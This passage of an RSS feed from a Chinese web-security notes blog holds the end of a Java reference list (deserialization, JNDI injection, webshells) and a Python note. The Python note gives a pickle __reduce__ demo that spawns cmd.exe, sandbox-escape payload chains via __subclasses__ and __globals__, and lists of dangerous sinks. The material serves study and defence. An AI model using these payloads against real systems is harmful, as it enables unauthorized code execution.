&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mcm9ob2ZmLmdpdGh1Yi5pby9hcHBzZWNjYWxpLW1hcnNoYWxsaW5nLXBpY2tsZXMv&#34;&gt;AppSecCali 2015: Marshalling Pickles&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dvdXRlci5jb2VrYWVydHMuYmUvMjAxNS9hbm5vdGF0aW9uaW52b2NhdGlvbmhhbmRsZXI=&#34;&gt;More serialization hacks with AnnotationInvocationHandler&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B3bnRlc3Rlci9KUkU4dTIwX1JDRV9HYWRnZXQ=&#34;&gt;Pure JRE 8 RCE Deserialization gadget&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NsaWdodGx5cmFuZG9tYnJva2VudGhvdWdodHMuYmxvZ3Nwb3QuY29tLzIwMTAvMDgvYnJlYWtpbmctZGVmZW5zaXZlLXNlcmlhbGl6YXRpb24uaHRtbA==&#34;&gt;Breaking Defensive Serialization&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvbk5UdzNITW5rWDYzZDl5YmR4M1VTUQ==&#34;&gt;Java 反序列化漏洞从入门到深入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNoYWl0aW4uY24vMjAxNS0xMS0xMV9qYXZhX3Vuc2VyaWFsaXplX3JjZS8=&#34;&gt;Java 反序列化漏洞通用利用分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzE3NjY3Mi5odG1s&#34;&gt;JRE8u20 反序列化漏洞分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzg0Nw==&#34;&gt;浅析 Java 序列化和反序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvOTc=&#34;&gt;Commons Collections Java 反序列化漏洞深入分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS9ldS0xOS9XZWRuZXNkYXkvZXUtMTktQW4tRmFyLVNpZGVzLU9mLUphdmEtUmVtb3RlLVByb3RvY29scy5wZGY=&#34;&gt;FAR SIDES OF JAVA REMOTE PROTOCOLS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvM2JKNjY4R1ZiMzluVDBORFZELTNJQQ==&#34;&gt;JDK8u20 反序列化漏洞新型 PoC 思路及具体实现&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTgvMDMvcHduLWN0Zi1wbGF0Zm9ybS13aXRoLWphdmEtanJtcC1nYWRnZXQuaHRtbA==&#34;&gt;Pwn a CTF Platform with Java JRMP Gadget&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDg0Ni5odG1s&#34;&gt;漫谈 JEP 290&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;框架-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架-2&#34;&gt;#&lt;/a&gt; 框架&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2OTc3MC5odG1s&#34;&gt;WebLogic 反序列化漏洞漫谈&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZXJ0LjM2MC5jbi9yZXBvcnQvZGV0YWlsP2lkPWM4ZWVkNGIzNmZlOGIxOWM1ODVhMTgxN2I1ZjEwYjll&#34;&gt;从 WebLogic 看反序列化漏洞的利用与防御&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NoZW5ncWkxNTgvZmFzdGpzb24tcmVtb3RlLWNvZGUtZXhlY3V0ZS1wb2MvYmxvYi9tYXN0ZXIvSmF2YV9KU09OJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JUU0JUI5JThCJUU2JUFFJTg3XyVFNyU5QyU4QiVFOSU5QiVBQSVFNSVBRSU4OSVFNSU4NSVBOCVFNSVCQyU4MCVFNSU4RiU5MSVFOCU4MCU4NSVFNSVCMyVCMCVFNCVCQyU5QS5wZGY=&#34;&gt;JSON 反序列化之殇&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mval9neDlDX3hMMUx5cm51RkZQRnNmZw==&#34;&gt;Shiro 组件漏洞与攻击链分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3EuY29tL2FydGljbGVzL2FwYWNoZS1zaGlyby8=&#34;&gt;Application Security With Apache Shiro&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE3Njk1Ng==&#34;&gt;Shiro 安全框架【快速入门】&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzY3NzAy&#34;&gt;Shiro 实战 (四) - 过滤器机制&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;沙箱-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱-2&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2VzY2FwaW5nX3RoZV9qYXZhX3NhbmRib3guaHRtbA==&#34;&gt;Java Sandbox Escape&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;框架-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架-3&#34;&gt;#&lt;/a&gt; 框架&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHM=&#34;&gt;Struts&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHMtZXhhbXBsZXM=&#34;&gt;Struts Examples&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2VjbGlwc2UvamV0dHkucHJvamVjdA==&#34;&gt;Eclipse Jetty&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L1NwcmluZ0Jvb3RWdWxFeHBsb2l0&#34;&gt;SpringBootVulExploit&lt;/span&gt; SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;框架利用技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架利用技巧&#34;&gt;#&lt;/a&gt; 框架利用技巧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYW5kZ3JleS5tZS9ibG9nLzIyLw==&#34;&gt;Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rmi-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-2&#34;&gt;#&lt;/a&gt; RMI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWdqMDkzMC9wLzY1NDI4MTEuaHRtbA==&#34;&gt;Java RMI 与 RPC 的区别&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3JlaWxseS5jb20vbGlicmFyeS92aWV3L2xlYXJuaW5nLWphdmEvMTU2NTkyNzE4NC9jaDExczA0Lmh0bWw=&#34;&gt;Remote Method Invocation (RMI)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwOTE=&#34;&gt;Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvY3Mub3JhY2xlLmNvbS9jZC9FMTEwMzVfMDEvd2xzMTAwL2NsaWVudC90My5odG1s&#34;&gt;Oracle: Developing T3 Clients&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jndi-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi-2&#34;&gt;#&lt;/a&gt; JNDI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlL3R1dG9yaWFsL2puZGkvb3ZlcnZpZXcvaW5kZXguaHRtbA==&#34;&gt;Overview of JNDI&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQxNy8=&#34;&gt;关于 JNDI 注入&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU11bm96LUEtSm91cm5leS1Gcm9tLUpOREktTERBUC1NYW5pcHVsYXRpb24tVG8tUkNFLnBkZg==&#34;&gt;A Journey From JNDI LDAP Manipulation To RCE&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwNzQzOS5odG1s&#34;&gt;如何绕过高版本 JDK 的限制进行 JNDI 注入&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;webshell-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webshell-2&#34;&gt;#&lt;/a&gt; WebShell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzc5OA==&#34;&gt;各种姿势 jsp webshell&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他漏洞&#34;&gt;#&lt;/a&gt; 其他漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2xhbmd1YWdlL2phdmEvYmxvZy5zcG9vY2suY29tLzIwMTgvMTAvMjMvamF2YS14eGUvaW5kZXguaHRtbA==&#34;&gt;JAVA 常见的 XXE 漏洞写法和防御&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/</guid>
            <title>Python</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>混淆</category>
            <category>沙箱</category>
            <category>Python</category>
            <pubDate>Sun, 27 Nov 2022 16:42:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;格式化字符串&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化字符串&#34;&gt;#&lt;/a&gt; 格式化字符串&lt;/h1&gt;
&lt;p&gt;在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为  &lt;code&gt;&amp;quot;this is a %s&amp;quot; % &amp;quot;test&amp;quot;&lt;/code&gt;  ，之后增加了 format 的方式， 语法为  &lt;code&gt;&amp;quot;this is a &amp;#123;&amp;#125;&amp;quot;.format(&#39;test&#39;)&lt;/code&gt;  或者  &lt;code&gt;&amp;quot;this is a &amp;#123;test&amp;#125;&amp;quot;.format(test=&#39;test&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &#39;class of &amp;#123;0&amp;#125; is &amp;#123;0.__class__&amp;#125;&#39;.format(42)
&amp;quot;class of 42 is &amp;lt;class &#39;int&#39;&amp;gt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从上面这个简单的例子不难知道，当我们可以控制要 format 的字符串时，则可以使用  &lt;code&gt;__init__&lt;/code&gt;  /  &lt;code&gt;__globals__&lt;/code&gt;  等属性读取一些比较敏感的值，甚至任意执行代码。&lt;/p&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;pickle-demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle-demo&#34;&gt;#&lt;/a&gt; pickle demo&lt;/h2&gt;
&lt;p&gt;Python Pickle 在反序列化时会调用  &lt;code&gt;__reduce__&lt;/code&gt;  ，可用自定义的  &lt;code&gt;__reduce__&lt;/code&gt;  函数来实现攻击。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; subprocess&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;subprocess&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Popen&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cmd.exe&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickletools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dis&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;其他序列化库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他序列化库&#34;&gt;#&lt;/a&gt; 其他序列化库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;PyYAML&lt;/li&gt;
&lt;li&gt;marshal&lt;/li&gt;
&lt;li&gt;shelve&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h1&gt;
&lt;h2 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;eval / exec / compile&lt;/li&gt;
&lt;li&gt;dir / type&lt;/li&gt;
&lt;li&gt;globals / locals / vars&lt;/li&gt;
&lt;li&gt;getattr / setattr&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;导入包方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#导入包方式&#34;&gt;#&lt;/a&gt; 导入包方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;import os&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;from os import *&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__import__(&amp;quot;os&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;importlib&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;imp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reload(os)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;execfile&lt;/code&gt;  仅 Python2 支持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dir(__builtins__)&lt;/code&gt;  查看内置模块&lt;/li&gt;
&lt;li&gt;最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了&lt;/li&gt;
&lt;li&gt;在父类中寻找可用的模块，最常见 payload 是  &lt;code&gt;().__class__.__bases__[0].__subclasses__()&lt;/code&gt;  或者用魔术方法获取全局作用域  &lt;code&gt;__init__.__func__.__globals__&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用  &lt;code&gt;https://gist.github.com/freddyb/3360650&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;A&amp;quot;&amp;quot;B&amp;quot; == &amp;quot;AB&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h2&gt;
&lt;p&gt;Python 官方给出了一些防御的建议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 Jython 并尝试使用 Java 平台来锁定程序的权限&lt;/li&gt;
&lt;li&gt;使用 fakeroot 来避免&lt;/li&gt;
&lt;li&gt;使用一些 rootjail 的技术&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架&#34;&gt;#&lt;/a&gt; 框架&lt;/h1&gt;
&lt;h2 id=&#34;django&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#django&#34;&gt;#&lt;/a&gt; Django&lt;/h2&gt;
&lt;h3 id=&#34;历史漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#历史漏洞&#34;&gt;#&lt;/a&gt; 历史漏洞&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4Lw==&#34;&gt;CVE-2016-7401 CSRF Bypass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGphbmdvcHJvamVjdC5jb20vd2VibG9nLzIwMTcvYXByLzA0L3NlY3VyaXR5LXJlbGVhc2VzLw==&#34;&gt;CVE-2017-7233/7234 Open redirect vulnerability&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZGphbmdvLWRlYnVnLXBhZ2UteHNzLmh0bWw=&#34;&gt;CVE-2017-12794 debug page XSS&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置相关&#34;&gt;#&lt;/a&gt; 配置相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;flask&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flask&#34;&gt;#&lt;/a&gt; Flask&lt;/h2&gt;
&lt;p&gt;Flask 默认使用客户端 session，使得 session 可以被伪造&lt;/p&gt;
&lt;h1 id=&#34;代码混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码混淆&#34;&gt;#&lt;/a&gt; 代码混淆&lt;/h1&gt;
&lt;h2 id=&#34;常见混淆方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见混淆方式&#34;&gt;#&lt;/a&gt; 常见混淆方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基于 AST 变换&lt;/li&gt;
&lt;li&gt;编译为 pyc 文件&lt;/li&gt;
&lt;li&gt;Pyinstaller&lt;/li&gt;
&lt;li&gt;PyArmor&lt;/li&gt;
&lt;li&gt;通过 AES 加密为 pye 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;asyncio.new_event_loop().subprocess_exec&lt;/li&gt;
&lt;li&gt;asyncio.subprocess&lt;/li&gt;
&lt;li&gt;bdb.os&lt;/li&gt;
&lt;li&gt;cgi.os.system&lt;/li&gt;
&lt;li&gt;cgi.sys&lt;/li&gt;
&lt;li&gt;code.InteractiveInterpreter&lt;/li&gt;
&lt;li&gt;commands&lt;/li&gt;
&lt;li&gt;ctypes.CDLL&lt;/li&gt;
&lt;li&gt;eval&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;execfile&lt;/li&gt;
&lt;li&gt;input // python2 only&lt;/li&gt;
&lt;li&gt;os.exec&lt;/li&gt;
&lt;li&gt;os.exec*&lt;/li&gt;
&lt;li&gt;os.fork&lt;/li&gt;
&lt;li&gt;os.popen&lt;/li&gt;
&lt;li&gt;os.spawn&lt;/li&gt;
&lt;li&gt;os.system&lt;/li&gt;
&lt;li&gt;platform.os&lt;/li&gt;
&lt;li&gt;platform.popen&lt;/li&gt;
&lt;li&gt;platform.sys&lt;/li&gt;
&lt;li&gt;popen2&lt;/li&gt;
&lt;li&gt;pty.os&lt;/li&gt;
&lt;li&gt;pty.spawn&lt;/li&gt;
&lt;li&gt;subprocess&lt;/li&gt;
&lt;li&gt;timeit.sys&lt;/li&gt;
&lt;li&gt;timeit.timeit&lt;/li&gt;
&lt;li&gt;typing.get_type_hints() +  &lt;code&gt;__annotations__&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;open&lt;/li&gt;
&lt;li&gt;os.open&lt;/li&gt;
&lt;li&gt;urllib.request.urlopen(&#39;[file:///](file:///)&#39;)&lt;/li&gt;
&lt;li&gt;codecs.open&lt;/li&gt;
&lt;li&gt;fileinput&lt;/li&gt;
&lt;li&gt;仅 Python2
&lt;ul&gt;
&lt;li&gt;types.FileType&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
